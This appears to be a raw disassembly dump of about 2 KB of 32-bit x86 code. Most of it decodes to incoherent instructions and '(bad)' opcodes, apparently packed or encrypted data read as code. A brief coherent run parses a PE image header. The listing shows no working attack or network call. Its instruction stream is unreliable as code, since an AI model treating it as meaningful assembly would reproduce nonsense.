  40a4ef:	js     0x40a4c7
  40a4f1:	dec    esi
  40a4f2:	add    eax,0xd6faf54a
  40a4f7:	and    al,dl
  40a4f9:	pop    DWORD PTR [ebx-0x34]
  40a4fc:	sbb    DWORD PTR [ebp+0x77ba77d8],edx
  40a502:	(bad)  
  40a503:	mov    ds:0x8c312e60,al
  40a508:	adc    ah,al
  40a50a:	fidivr WORD PTR [eax+0x33bde6fb]
  40a510:	lock sbb eax,0x8fba83ea
  40a516:	adc    al,0x9
  40a518:	cmp    DWORD PTR [ebx-0x27],ebx
  40a51b:	jo     0x40a51d
  40a51d:	mov    dh,0xc3
  40a51f:	jl     0x40a4d2
  40a521:	and    BYTE PTR [edx+0x75],ah
  40a524:	js     0x40a550
  40a526:	outs   dx,DWORD PTR ds:[esi]
  40a527:	scas   al,BYTE PTR es:[edi]
  40a528:	stos   DWORD PTR es:[edi],eax
  40a529:	sub    al,0x9e
  40a52b:	bound  edx,QWORD PTR [edx+0x7f8f1500]
  40a531:	pop    edx
  40a532:	fmul   DWORD PTR [ebx-0x27]
  40a535:	stos   BYTE PTR es:[edi],al
  40a536:	jg     0x40a4bb
  40a538:	aam    0x59
  40a53a:	push   ss
  40a53b:	mov    edx,0x1d9f54b2
  40a540:	xor    al,0x4
  40a542:	test   edi,ebx
  40a544:	and    al,0xb9
  40a546:	adc    DWORD PTR [edi-0x5f],ebp
  40a549:	jmp    0xce8ad475
  40a54e:	xlat   BYTE PTR ds:[ebx]
  40a54f:	stc    
  40a550:	repnz jmp FWORD PTR [edx-0x41]
  40a554:	jnp    0x40a54f
  40a556:	xchg   ebx,eax
  40a557:	dec    esp
  40a558:	leave  
  40a559:	jmp    0x8b05bb70
  40a55e:	sbb    DWORD PTR [edx],ebx
  40a560:	popa   
  40a561:	pop    ebx
  40a562:	sahf   
  40a563:	shl    bh,0xf
  40a566:	jbe    0x40a5d7
  40a568:	jle    0x40a5a8
  40a56a:	or     BYTE PTR [ebx-0x5a],bh
  40a56d:	dec    esi
  40a56e:	add    esp,DWORD PTR ds:0x8a88d244
  40a574:	stos   BYTE PTR es:[edi],al
  40a575:	pop    ss
  40a576:	xor    DWORD PTR [eax+0x70],ebp
  40a579:	sbb    eax,0x2e3ea024
  40a57e:	xchg   esp,eax
  40a57f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a580:	stos   DWORD PTR es:[edi],eax
  40a581:	add    eax,0x77b982e5
  40a586:	inc    ecx
  40a587:	jge    0x40a51c
  40a589:	(bad)  
  40a58a:	dec    eax
  40a58b:	cmc    
  40a58c:	int3   
  40a58d:	sbb    edi,DWORD PTR [eax+0x6d]
  40a590:	or     al,0x9f
  40a592:	lds    edx,FWORD PTR [eax+0x1d3452ad]
  40a598:	enter  0xc311,0xbf
  40a59c:	add    bh,bl
  40a59e:	cdq    
  40a59f:	pushf  
  40a5a0:	add    DWORD PTR ds:0x7010fe8e,ecx
  40a5a6:	or     BYTE PTR [eax-0x22],dh
  40a5a9:	scas   al,BYTE PTR es:[edi]
  40a5aa:	cmp    al,0xc5
  40a5ac:	cwde   
  40a5ad:	xchg   ecx,esp
  40a5af:	in     al,0xda
  40a5b1:	add    al,0x5
  40a5b3:	rcl    BYTE PTR [ebp-0x80],cl
  40a5b6:	mov    ds:0x47e45fb9,eax
  40a5bb:	add    eax,0x3e1b415b
  40a5c0:	push   0x79373250
  40a5c5:	cld    
  40a5c6:	and    esp,DWORD PTR ds:0xa4dc9288
  40a5cc:	fs int 0x10
  40a5cf:	mov    ds:0x6d3b25b9,al
  40a5d4:	idiv   BYTE PTR [edi+0x47f8328]
  40a5da:	adc    BYTE PTR [ecx],dh
  40a5dc:	sbb    esp,DWORD PTR [esi]
  40a5de:	loopne 0x40a603
  40a5e0:	add    al,0x1f
  40a5e2:	aad    0xcf
  40a5e4:	pop    edi
  40a5e5:	pop    ecx
  40a5e6:	adc    al,0x55
  40a5e8:	sbb    ecx,DWORD PTR [eax+0x28458a82]
  40a5ee:	sbb    al,0x9d
  40a5f0:	js     0x40a585
  40a5f2:	jno    0x40a5af
  40a5f4:	imul   ebp,DWORD PTR [esi+esi*4+0x13],0x2d
  40a5f9:	push   ebx
  40a5fa:	pop    eax
  40a5fb:	inc    esp
  40a5fc:	lahf   
  40a5fd:	std    
  40a5fe:	ins    BYTE PTR es:[edi],dx
  40a5ff:	pop    eax
  40a600:	cmp    BYTE PTR [edi-0x3e5a1d84],ah
  40a606:	arpl   WORD PTR [edi],ax
  40a608:	int3   
  40a609:	ins    BYTE PTR es:[edi],dx
  40a60a:	call   0xb2a1e062
  40a60f:	pop    eax
  40a610:	xor    eax,0xbd459ab4
  40a615:	xchg   BYTE PTR [ecx+0x1b21937b],cl
  40a61b:	daa    
  40a61c:	mov    ?,WORD PTR [bp+si]
  40a61f:	shl    edx,cl
  40a621:	and    al,BYTE PTR [edi]
  40a623:	stos   DWORD PTR es:[edi],eax
  40a624:	pop    ecx
  40a625:	push   DWORD PTR [eax]
  40a627:	shl    DWORD PTR [ecx],1
  40a629:	test   al,0xed
  40a62b:	or     eax,0xb689bdae
  40a630:	dec    ebp
  40a631:	mov    es,WORD PTR [edi+edi*8]
  40a634:	(bad)  
  40a635:	push   edx
  40a636:	adc    al,0x52
  40a638:	test   al,0xc2
  40a63a:	aam    0xf1
  40a63c:	push   ebx
  40a63d:	retf   
  40a63e:	into   
  40a63f:	pop    ecx
  40a640:	mov    esp,ebx
  40a642:	xchg   esi,eax
  40a643:	pop    ecx
  40a644:	xchg   ebx,eax
  40a645:	pop    ss
  40a646:	jbe    0x40a666
  40a648:	shl    BYTE PTR [ebp-0x29],cl
  40a64b:	ins    DWORD PTR es:[edi],dx
  40a64c:	popa   
  40a64d:	lock add edi,0x49
  40a651:	aaa    
  40a652:	je     0x40a610
  40a654:	and    ah,ah
  40a656:	inc    esi
  40a657:	std    
  40a658:	(bad)  
  40a659:	dec    edi
  40a65a:	sub    DWORD PTR [ebx+0x7b],0x543b1aea
  40a661:	scas   al,BYTE PTR es:[edi]
  40a662:	aam    0xbe
  40a664:	leave  
  40a665:	lock adc eax,0xd8fb6270
  40a66b:	addr16 push cs
  40a66d:	mov    ds:0x3339ea1b,eax
  40a672:	mov    ebx,0x263e95c2
  40a677:	sti    
  40a678:	sub    al,0xf5
  40a67a:	xor    BYTE PTR [esi],0x9
  40a67d:	inc    eax
  40a67e:	(bad)  [edi+0x4d783ac]
  40a684:	push   edx
  40a685:	inc    ebp
  40a686:	mov    WORD PTR [eax-0x51],fs
  40a689:	mov    ds:0xaac7e2dc,eax
  40a68e:	and    BYTE PTR [eax+edx*4-0xed1c3b5],cl
  40a695:	test   BYTE PTR [ebx+ecx*1],cl
  40a698:	push   edx
  40a699:	mov    esp,0x9cec0545
  40a69e:	push   esp
  40a69f:	daa    
  40a6a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6a1:	mov    al,0x14
  40a6a3:	xchg   esp,eax
  40a6a4:	(bad)  
  40a6a5:	mov    bh,0xc5
  40a6a7:	push   ebx
  40a6a8:	pop    ebp
  40a6a9:	(bad)  [ecx]
  40a6ab:	inc    edx
  40a6ac:	pop    ds
  40a6ad:	push   ebx
  40a6ae:	mov    ds:0x70248024,eax
  40a6b3:	ds xchg esi,eax
  40a6b5:	mov    ah,0xab
  40a6b7:	mov    ecx,0x14975527
  40a6bc:	mov    ecx,0x442d834d
  40a6c1:	lock test DWORD PTR [esi],0x9a337b18
  40a6c8:	enter  0xe086,0x27
  40a6cc:	or     BYTE PTR [eax-0x7c11caf4],ah
  40a6d2:	imul   edx,DWORD PTR [esi-0x35d881ca],0x34685d7
  40a6dc:	(bad)  
  40a6dd:	jmp    0x40a9fe
  40a6e2:	in     eax,0x96
  40a6e4:	not    BYTE PTR [ebp+esi*2+0x15776574]
  40a6eb:	sub    dh,BYTE PTR [eax+edi*4-0x2c]
  40a6ef:	inc    edx
  40a6f0:	test   DWORD PTR [edx+0x78],0x7a7e7ee9
  40a6f7:	jge    0x40a777
  40a6f9:	jle    0x40a69f
  40a6fb:	or     eax,DWORD PTR [edx+0x6f]
  40a6fe:	iret   
  40a6ff:	pusha  
  40a700:	inc    DWORD PTR [eax+ecx*1]
  40a703:	lods   eax,DWORD PTR ds:[esi]
  40a704:	scas   al,BYTE PTR es:[edi]
  40a705:	lea    ebx,[ecx-0x4f]
  40a708:	popa   
  40a709:	mov    dl,0x50
  40a70b:	enter  0x7527,0xa5
  40a70f:	daa    
  40a710:	push   0x3918738b
  40a715:	sbb    dl,BYTE PTR [esi]
  40a717:	(bad)  
  40a718:	jbe    0x40a776
  40a71a:	push   edi
  40a71b:	pop    ebp
  40a71c:	outs   dx,DWORD PTR ds:[esi]
  40a71d:	pop    edi
  40a71e:	ficom  WORD PTR [eax-0x4327c763]
  40a724:	call   0xc0142d89
  40a729:	sub    esp,DWORD PTR [ecx]
  40a72b:	sar    BYTE PTR ds:0xdee2d1ce,1
  40a731:	pop    eax
  40a732:	lahf   
  40a733:	aam    0xcb
  40a735:	clc    
  40a736:	mov    dl,BYTE PTR [ebx+0x3995e36e]
  40a73c:	and    al,0x6c
  40a73e:	jge    0x40a757
  40a740:	syscall 
  40a742:	mov    ebx,0x5196fe33
  40a747:	cdq    
  40a748:	xchg   esp,eax
  40a749:	jg     0x40a712
  40a74b:	or     esp,ecx
  40a74d:	ins    DWORD PTR es:[edi],dx
  40a74e:	inc    ecx
  40a74f:	ficom  WORD PTR [edx]
  40a751:	mov    ds:0xb640cae7,al
  40a756:	clc    
  40a757:	pusha  
  40a758:	xchg   ecx,eax
  40a759:	sbb    al,0xcb
  40a75b:	shl    edx,0x27
  40a75e:	cmp    BYTE PTR [ebp-0x4],bh
  40a761:	arpl   WORD PTR [esi],di
  40a763:	pop    ebx
  40a764:	jmp    0x40a7d9
  40a766:	and    al,0x53
  40a768:	call   0x4fc0:0x77980fd3
  40a76f:	inc    esi
  40a770:	mov    bl,BYTE PTR [ebx+edi*4+0x5b]
  40a774:	iret   
  40a775:	xor    al,BYTE PTR [ebx-0x79]
  40a778:	cmp    dh,BYTE PTR es:0xe73b8b4c
  40a77f:	cmovb  ebp,DWORD PTR [eax-0x4d3fb5e7]
  40a786:	mov    ebp,0xa41f1515
  40a78b:	add    dh,dl
  40a78d:	push   ecx
  40a78e:	stos   DWORD PTR es:[edi],eax
  40a78f:	cmp    bl,BYTE PTR [ebx]
  40a791:	ins    DWORD PTR es:[edi],dx
  40a792:	ds mov bh,0xf
  40a795:	jae    0x40a763
  40a797:	mov    esi,0x2be1e4cb
  40a79c:	mov    dh,BYTE PTR [edx-0x71]
  40a79f:	adc    al,BYTE PTR [eax]
  40a7a1:	adc    eax,DWORD PTR [ecx+esi*2]
  40a7a4:	(bad)  
  40a7a6:	repz sub ebp,DWORD PTR [eax]
  40a7a9:	arpl   WORD PTR [ecx+0xd],si
  40a7ac:	and    bl,dh
  40a7ae:	pushf  
  40a7af:	sbb    cl,ah
  40a7b1:	add    al,0x34
  40a7b3:	push   0xcbbbb7a9
  40a7b8:	cld    
  40a7b9:	aaa    
  40a7ba:	push   es
  40a7bb:	mov    ch,0x0
  40a7bd:	and    al,0xc9
  40a7bf:	mov    esp,0xde9c22ad
  40a7c4:	je     0x40a7f7
  40a7c6:	loop   0x40a7a5
  40a7c8:	inc    ebp
  40a7c9:	std    
  40a7ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7cb:	cmp    bh,al
  40a7cd:	lea    edi,[ebp+0x629c0e09]
  40a7d3:	sbb    al,0xf
  40a7d6:	or     eax,edx
  40a7d8:	in     eax,dx
  40a7d9:	mov    BYTE PTR [ecx],bl
  40a7db:	mov    esi,0xedeff5d5
  40a7e0:	in     al,0x90
  40a7e2:	jl     0x40a7f6
  40a7e4:	imul   DWORD PTR [ebp-0x36b1bc69]
  40a7ea:	neg    BYTE PTR [ebx+0x68]
  40a7ed:	jbe    0x40a7ad
  40a7ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7f0:	lahf   
  40a7f1:	out    dx,al
  40a7f2:	lods   eax,DWORD PTR ds:[esi]
  40a7f3:	mov    bl,0x7c
  40a7f5:	adc    DWORD PTR [esi],esi
  40a7f7:	popa   
  40a7f8:	fmul   st,st(6)
  40a7fa:	jnp    0x40a78d
  40a7fc:	jb     0x40a86c
  40a7fe:	enter  0x878f,0xd4
  40a802:	jge    0x40a81d
  40a804:	mov    eax,ds:0xe7b35381
  40a809:	dec    edi
  40a80a:	xchg   edx,eax
  40a80b:	rcl    BYTE PTR [ecx-0x2a224ae8],1
  40a811:	outs   dx,DWORD PTR ds:[esi]
  40a812:	jle    0x40a815
  40a814:	gs add eax,0x74b2b6fc
  40a81a:	and    dl,0x83
  40a81d:	push   eax
  40a81e:	rcr    DWORD PTR [eax+0x5b],0x8
  40a822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a823:	mov    ss,WORD PTR [edi-0x4b49fa76]
  40a829:	mov    bl,0x47
  40a82b:	xor    esp,0x7339ab33
  40a831:	push   ebx
  40a832:	scas   al,BYTE PTR es:[edi]
  40a833:	mov    al,0xfd
  40a835:	(bad)  
  40a836:	(bad)  
  40a837:	jae    0x40a8b3
  40a839:	mov    esi,ebp
  40a83b:	(bad)  
  40a83c:	xor    al,0xda
  40a83e:	sbb    ah,BYTE PTR [edi-0x6e]
  40a841:	and    ah,BYTE PTR [ebx]
  40a843:	pop    ss
  40a844:	inc    eax
  40a845:	nop
  40a846:	test   eax,0xac4eb080
  40a84b:	enter  0xeda0,0xd5
  40a84f:	sbb    al,0x74
  40a851:	fsubr  QWORD PTR [esi*8-0x703da896]
  40a858:	xor    eax,DWORD PTR [esi+0x54]
  40a85b:	paddusw mm6,mm4
  40a85e:	push   0x8fe84b12
  40a863:	or     ch,BYTE PTR [esi+0x57]
  40a866:	or     DWORD PTR [ecx-0x25],ecx
  40a869:	adc    BYTE PTR [esi+0xdebcb98],0x5d
  40a870:	adc    ch,BYTE PTR [ebx*2-0x37223582]
  40a877:	(bad)  [esp+ebx*2+0xf]
  40a87b:	test   eax,0xea5d3c6
  40a880:	rep lods al,BYTE PTR ds:[esi]
  40a882:	xlat   BYTE PTR ds:[ebx]
  40a883:	in     eax,0xc0
  40a885:	int    0x4f
  40a887:	mov    ah,0xb0
  40a889:	pop    ss
  40a88a:	ror    BYTE PTR [ebp+ebx*2+0x61],1
  40a88e:	jns    0x40a90c
  40a890:	and    ecx,DWORD PTR [edi+0x2650db17]
  40a896:	push   eax
  40a897:	pop    edx
  40a898:	xchg   edi,eax
  40a899:	push   cs
  40a89a:	mov    dh,0xa3
  40a89c:	out    dx,eax
  40a89d:	push   ebp
  40a89e:	clc    
  40a89f:	cli    
  40a8a0:	jbe    0x40a8d7
  40a8a2:	fmul   DWORD PTR [ebp-0x30f1b8ab]
  40a8a8:	cmp    al,0x19
  40a8aa:	repz sub eax,0xdff48a62
  40a8b0:	lods   al,BYTE PTR ds:[esi]
  40a8b1:	je     0x40a8b2
  40a8b3:	out    0x21,eax
  40a8b5:	push   esi
  40a8b6:	loop   0x40a845
  40a8b8:	neg    BYTE PTR [edx-0x54d02230]
  40a8be:	call   0x98b2c98
  40a8c3:	sbb    al,0x7a
  40a8c5:	add    BYTE PTR [edx+ebp*4],ah
  40a8c8:	xor    BYTE PTR [edi+0x25],0xe3
  40a8cc:	int    0x7a
  40a8ce:	lds    esp,FWORD PTR [edi-0x7142dfd6]
  40a8d4:	stos   BYTE PTR es:[edi],al
  40a8d5:	and    BYTE PTR [esi+edi*1],dl
  40a8d8:	cld    
  40a8d9:	sbb    ecx,DWORD PTR [edx-0x2a92476f]
  40a8df:	pop    esp
  40a8e0:	pop    ds
  40a8e1:	rol    DWORD PTR ds:0xf45fcff,0xcb
  40a8e8:	mov    ebx,0x4822bd05
  40a8ed:	sti    
  40a8ee:	add    bh,bl
  40a8f0:	add    ecx,DWORD PTR [ecx]
  40a8f2:	jmp    0x40a8b9
  40a8f4:	pop    esi
  40a8f5:	mov    dh,0xcf
  40a8f7:	inc    eax
  40a8f8:	mov    edx,0x8a869443
  40a8fd:	sbb    bh,BYTE PTR [eax-0x7c666729]
  40a903:	add    DWORD PTR ss:[ecx],ecx
  40a906:	test   BYTE PTR [ebx+0x5954c76a],dl
  40a90c:	lahf   
  40a90d:	in     al,dx
  40a90e:	in     al,dx
  40a90f:	lahf   
  40a910:	into   
  40a911:	push   edi
  40a912:	pop    esp
  40a913:	pop    ebx
  40a914:	mov    ah,0x28
  40a916:	push   esp
  40a917:	sub    cl,al
  40a919:	retf   
  40a91a:	cli    
  40a91b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a91c:	loope  0x40a94f
  40a91e:	dec    ecx
  40a91f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a920:	xchg   ecx,eax
  40a921:	shl    DWORD PTR [eax+ebx*2-0x7bc9d532],0x68
  40a929:	in     eax,0x29
  40a92b:	dec    esp
  40a92c:	or     BYTE PTR [ecx],dh
  40a92e:	into   
  40a92f:	inc    ebp
  40a930:	test   eax,0x48ada445
  40a935:	mov    al,ds:0xe0a6f0c4
  40a93a:	lock inc ebx
  40a93c:	fmulp  st(2),st
  40a93e:	xor    eax,0x3727f40e
  40a943:	jno    0x40a928
  40a945:	rcl    DWORD PTR [edx+0x1aad53b3],cl
  40a94b:	or     ch,BYTE PTR [ecx+ecx*2]
  40a94e:	push   eax
  40a94f:	mov    eax,ds:0x74914e1b
  40a954:	bound  edi,QWORD PTR [ebx+0x40]
  40a957:	stos   BYTE PTR es:[di],al
  40a959:	dec    ebx
  40a95a:	clc    
  40a95b:	lock lahf 
  40a95d:	mov    ds:0xfd07999f,al
  40a962:	jecxz  0x40a91d
  40a964:	push   esp
  40a965:	mov    bl,0x22
  40a967:	(bad)  
  40a968:	jl     0x40a9d1
  40a96a:	int    0x67
  40a96c:	ret    
  40a96d:	xchg   bh,dh
  40a96f:	call   0x68bc9d1b
  40a974:	enter  0x530,0x7a
  40a978:	dec    eax
  40a979:	cmp    ah,BYTE PTR [ebx+0x4d]
  40a97c:	jge    0x40a9be
  40a97e:	je     0x40a905
  40a980:	xor    BYTE PTR [edi-0xd],ch
  40a983:	xchg   edx,eax
  40a984:	jmp    0xfa44:0x30458946
  40a98b:	and    DWORD PTR [esi+0x3449776d],ebp
  40a991:	aad    0xdd
  40a993:	leave  
  40a994:	cmp    DWORD PTR [edi+0x5e1a741c],ecx
  40a99a:	add    cl,dl
  40a99c:	imul   ebp,eax,0x1e21b68
  40a9a2:	cmp    ebx,edi
  40a9a4:	out    0x1d,eax
  40a9a6:	int3   
  40a9a7:	js     0x40a9ea
  40a9a9:	test   al,0xfd
  40a9ab:	imul   eax,eax,0xffffffb6
  40a9ae:	cwde   
  40a9af:	fist   DWORD PTR [edi+0x410516a8]
  40a9b5:	fisttp WORD PTR [ebp-0x27]
  40a9b8:	xor    BYTE PTR [edi+0x21],0x19
  40a9bc:	jne    0x40a9f9
  40a9be:	push   ds
  40a9bf:	sahf   
  40a9c0:	(bad)  
  40a9c2:	mov    bl,0x8e
  40a9c4:	xor    cl,bl
  40a9c6:	cmp    esi,ecx
  40a9c8:	fdiv   QWORD PTR [eax+ebp*2+0x24]
  40a9cc:	jmp    0x40a9c7
  40a9ce:	mov    bh,0x98
  40a9d0:	outs   dx,BYTE PTR ds:[esi]
  40a9d1:	mov    bl,0xf9
  40a9d3:	jp     0x40aa3d
  40a9d5:	push   edx
  40a9d6:	and    al,0x5f
  40a9d8:	jecxz  0x40a965
  40a9da:	mov    DWORD PTR ds:0x923b7db5,ebx
  40a9e0:	out    0xfe,eax
  40a9e2:	mov    ecx,0xe88a8cfe
  40a9e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9e8:	adc    eax,0xe61b4528
  40a9ed:	mov    BYTE PTR [ebx+0x8d938e9],bh
  40a9f3:	test   BYTE PTR ds:0x5e7b5ca2,ah
  40a9f9:	call   0x139:0xd70b637b
  40aa00:	je     0x40ba28
  40aa06:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa09:	mov    eax,DWORD PTR [ebp-0x8]
  40aa0c:	mov    eax,DWORD PTR [eax]
  40aa0e:	mov    eax,DWORD PTR [eax+0x3c]
  40aa11:	lea    ecx,[ecx*8+0x78]
  40aa18:	jmp    0x40ad39
  40aa1d:	dec    ebx
  40aa1e:	mov    bl,BYTE PTR [edi+0x55]
  40aa21:	pop    edi
  40aa22:	jno    0x40aa95
  40aa24:	nop
  40aa25:	retf   0x4daf
  40aa28:	add    DWORD PTR [edx-0x15],esp
  40aa2b:	cli    
  40aa2c:	repnz add al,0xf4
  40aa2f:	jle    0x40aaaf
  40aa31:	jp     0x40aab0
  40aa33:	jle    0x40aab3
  40aa35:	(bad)
  40aa39:	test   eax,0xc3c1ceb6
  40aa3e:	dec    esi
  40aa3f:	in     al,0x36
  40aa41:	inc    ebx
  40aa42:	dec    eax
  40aa43:	add    cl,BYTE PTR [ebx*4-0x5551f02f]
  40aa4a:	ss daa 
  40aa4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa4d:	jl     0x40aaa8
  40aa4f:	xchg   edx,eax
  40aa50:	loope  0x40a9d7
  40aa52:	xor    BYTE PTR [eax+0x7c1e7b1b],dl
  40aa58:	sbb    edx,DWORD PTR [ebp+edx*8-0x79b10a57]
  40aa5f:	mov    eax,ds:0x144bd89
  40aa64:	es jg  0x40a9e9
  40aa67:	lds    esi,FWORD PTR [esi-0x36]
  40aa6a:	adc    ch,BYTE PTR [ebx+edi*2]
  40aa6d:	ja     0x40aa1a
  40aa6f:	sbb    eax,0xc10da186
  40aa74:	js     0x40a9fd
  40aa76:	fist   WORD PTR [eax]
  40aa78:	add    bl,BYTE PTR [esi]
  40aa7a:	dec    ebp
  40aa7b:	sahf   
  40aa7c:	test   al,0xdd
  40aa7e:	push   es
  40aa7f:	jae    0x40aa1c
  40aa81:	adc    edx,edi
  40aa83:	jmp    0xfc8d:0x8541fc00
  40aa8a:	pop    ds
  40aa8b:	adc    ecx,edi
  40aa8d:	jle    0x40aa6a
  40aa8f:	popa   
  40aa90:	pushf  
  40aa91:	ja     0x40aa68
  40aa93:	and    eax,0x3bf7d59f
  40aa98:	xor    DWORD PTR ss:[ebp-0x47],esp
  40aa9c:	cld    
  40aa9d:	div    BYTE PTR [ecx-0x52e28ed8]
  40aaa3:	mov    ecx,DWORD PTR [ecx]
  40aaa5:	das    
  40aaa6:	add    BYTE PTR [ecx-0x5d81c82c],cl
  40aaac:	fnstcw WORD PTR [edx+0x1ada37be]
  40aab2:	into   
  40aab3:	add    ebp,DWORD PTR [esi+0x769e0b79]
  40aab9:	mov    ch,0xb4
  40aabb:	jg     0x40ab3b
  40aabd:	outs   dx,DWORD PTR ds:[esi]
  40aabe:	sbb    DWORD PTR [edx-0x46],edi
  40aac1:	inc    edi
  40aac2:	in     eax,0x34
  40aac4:	aaa    
  40aac5:	cs sub eax,0x32c61428
  40aacb:	pop    esp
  40aacc:	jmp    0x81e9:0x8794b6e5
  40aad3:	leave  
  40aad4:	sub    ah,BYTE PTR [edi+0x74]
  40aad7:	push   0xfffffff7
  40aad9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aada:	xchg   esi,eax
  40aadb:	int3   
  40aadc:	loop   0x40aad1
  40aade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aadf:	outs   dx,DWORD PTR ds:[esi]
  40aae0:	lahf   
  40aae1:	and    eax,0x95cbdd1c
  40aae6:	mov    bh,0x8e
  40aae8:	(bad)  
  40aae9:	(bad)  
  40aaeb:	dec    ecx
  40aaec:	pushf  
  40aaed:	cli    
  40aaee:	and    dl,BYTE PTR [edx]
  40aaf0:	adc    BYTE PTR ds:0x849a9596,bl
  40aaf6:	dec    ebx
  40aaf7:	mov    ds:0xa87369db,eax
  40aafc:	push   esi
  40aafd:	sub    eax,0xe65812b5
  40ab02:	push   0xcde43157
  40ab07:	push   ebp
  40ab09:	pop    edi
  40ab0a:	dec    esp
  40ab0b:	outs   dx,BYTE PTR ds:[esi]
  40ab0c:	popa   
  40ab0d:	jno    0x40ab41
  40ab0f:	or     DWORD PTR [edx],0x59
  40ab12:	lods   eax,DWORD PTR ds:[esi]
  40ab13:	mov    dl,BYTE PTR [ebx+0x20dfaef3]
  40ab19:	inc    ecx
  40ab1a:	xchg   ecx,eax
  40ab1b:	mov    eax,DWORD PTR [edx+0x385adadd]
  40ab21:	jg     0x40ab6b
  40ab23:	jg     0x40aae7
  40ab25:	lods   eax,DWORD PTR ds:[esi]
  40ab26:	sub    BYTE PTR [edx+0x67cc3ef],dh
  40ab2c:	pop    esi
  40ab2d:	pop    esi
  40ab2e:	xchg   ebp,eax
  40ab2f:	lods   eax,DWORD PTR ds:[esi]
  40ab30:	jmp    0x40ab6e
  40ab32:	les    eax,FWORD PTR [edx-0x3885919f]
  40ab38:	xor    dh,0xa5
  40ab3b:	cs jne 0x40ab89
  40ab3e:	push   ds
  40ab3f:	nop
  40ab40:	or     eax,0xaa91515e
  40ab45:	jb     0x40ab79
  40ab47:	fnsave [eax-0x75812df2]
  40ab4d:	test   al,0xd5
  40ab4f:	inc    esi
  40ab50:	pop    ebx
  40ab51:	xor    eax,0xdda576c2
  40ab56:	dec    ebx
  40ab57:	pop    eax
  40ab58:	add    DWORD PTR [edi-0x47870938],ebx
  40ab5e:	hlt    
  40ab5f:	sub    DWORD PTR [ebp+0x2c],edx
  40ab62:	addr16 pop ss
  40ab64:	mov    ch,0x4c
  40ab66:	inc    esi
  40ab67:	mov    esi,0x4d55daac
  40ab6c:	mov    cl,BYTE PTR [edi]
  40ab6e:	out    0x6,eax
  40ab70:	dec    edx
  40ab71:	mov    WORD PTR [ebx-0x46f25704],?
  40ab77:	push   edi
  40ab78:	loop   0x40ab0b
  40ab7a:	ins    BYTE PTR es:[edi],dx
  40ab7b:	sti    
  40ab7c:	and    bl,dl
  40ab7e:	mov    esi,0x9626f779
  40ab83:	mov    ebp,0x5968f952
  40ab88:	mov    WORD PTR [eax+0x7b],ss
  40ab8b:	xor    ebx,DWORD PTR [eax+0x1b279f31]
  40ab91:	or     eax,0xf6b03089
  40ab96:	mov    ebp,0x97627725
  40ab9b:	cmp    eax,0xb0e9b5e0
  40aba0:	or     esi,DWORD PTR [ecx]
  40aba2:	lahf   
  40aba3:	jae    0x40abfd
  40aba5:	not    DWORD PTR [ecx+0x44]
  40aba8:	int3   
  40aba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abaa:	mov    eax,0x640043ab
  40abaf:	push   ebp
  40abb0:	jmp    0x40ac1e
  40abb2:	or     al,0x30
  40abb4:	ja     0x40ac34
  40abb6:	ds call 0xfda95c17
  40abbc:	xchg   esi,eax
  40abbd:	inc    ecx
  40abbe:	mov    bh,0xb2
  40abc0:	shl    dh,1
  40abc2:	std    
  40abc3:	icebp  
  40abc4:	les    ecx,FWORD PTR [ebp+0x7]
  40abc7:	mov    dh,0x54
  40abc9:	(bad)  
  40abca:	fcom   DWORD PTR [ecx-0x5bd81d54]
  40abd0:	pop    ecx
  40abd1:	lods   eax,DWORD PTR ds:[esi]
  40abd2:	aas    
  40abd3:	enter  0x511b,0xfa
  40abd7:	dec    eax
  40abd8:	mov    ds:0x795cf0ef,al
  40abdd:	dec    esp
  40abde:	or     cl,dh
  40abe0:	shl    BYTE PTR [ebp+0x56486333],1
  40abe6:	inc    edi
  40abe7:	pop    ss
  40abe8:	cli    
  40abe9:	call   0x8163:0x3c776bd
  40abf0:	cmp    BYTE PTR [eax],dh
  40abf2:	not    BYTE PTR [edi+0x26]
  40abf5:	mov    ah,0xaa
  40abf7:	imul   ebx,DWORD PTR [edx],0xcdd155ae
  40abfd:	dec    edi
  40abfe:	jne    0x40abb7
  40ac00:	shl    BYTE PTR [edx+0x50a8fdac],cl
  40ac06:	sub    al,0x6c
  40ac08:	jp     0x40abd2
  40ac0a:	jmp    0x40ac42
  40ac0c:	int    0x10
  40ac0e:	dec    esi
  40ac0f:	es dec ecx
  40ac11:	jno    0x40ac55
  40ac13:	push   ecx
  40ac14:	jno    0x40ac2a
  40ac16:	and    DWORD PTR [eax+0x313c1bf6],0xb81d9dc2
  40ac20:	mov    dl,0xd5
  40ac22:	jae    0x40abe0
  40ac24:	or     al,0x6
  40ac26:	xlat   BYTE PTR ds:[ebx]
  40ac27:	lock or eax,0x6a12201d
  40ac2d:	ja     0x40ac9b
  40ac2f:	das    
  40ac30:	pop    esp
  40ac31:	cdq    
  40ac32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac33:	jge    0x40ac89
  40ac35:	in     eax,dx
  40ac36:	push   edi
  40ac37:	outs   dx,BYTE PTR ds:[esi]
  40ac38:	(bad)  
  40ac3a:	inc    edx
  40ac3b:	jmp    0x40abd8
  40ac3d:	inc    edi
  40ac3e:	mov    ebx,DWORD PTR [ebx-0x5]
  40ac41:	push   edx
  40ac42:	sub    esp,esp
  40ac44:	test   DWORD PTR [ecx-0x17],ebp
  40ac47:	sti    
  40ac48:	push   ss
  40ac49:	inc    esp
  40ac4a:	push   ebx
  40ac4b:	mov    esp,0xc068a87
  40ac50:	jg     0x40ac9e
  40ac52:	push   ebp
  40ac53:	(bad)  [ecx-0x46]
  40ac56:	cwde   
  40ac57:	in     al,0x2a
  40ac59:	mov    esp,0x4f0b0f2f
  40ac5e:	sti    
  40ac5f:	dec    edx
  40ac60:	or     DWORD PTR [esi+esi*1+0x2637227],ebp
  40ac67:	xchg   ecx,eax
  40ac68:	(bad)  
